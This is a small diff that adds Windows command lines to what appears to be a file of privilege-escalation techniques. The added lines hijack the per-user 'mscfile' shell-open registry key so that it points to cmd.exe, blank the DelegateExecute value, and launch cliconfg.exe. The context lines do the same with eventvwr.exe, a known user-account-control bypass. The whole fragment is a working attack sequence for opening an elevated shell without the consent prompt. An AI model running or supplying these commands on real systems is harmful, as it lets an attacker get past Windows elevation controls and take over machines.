@@ -21,4 +21,8 @@ REG ADD "HKCU\Software\Classes\mscfile\Shell\Open\command" /v "DelegateExecute" 
 REG QUERY "HKCU\Software\Classes\mscfile\Shell\Open\command"
 eventvwr.exe
 
+REG ADD "HKCU\Software\Classes\mscfile\Shell\Open\command" /d "cmd.exe" /f
+REG ADD "HKCU\Software\Classes\mscfile\Shell\Open\command" /v "DelegateExecute" /t REG_SZ /d "" /f
+cliconfg.exe
+
 
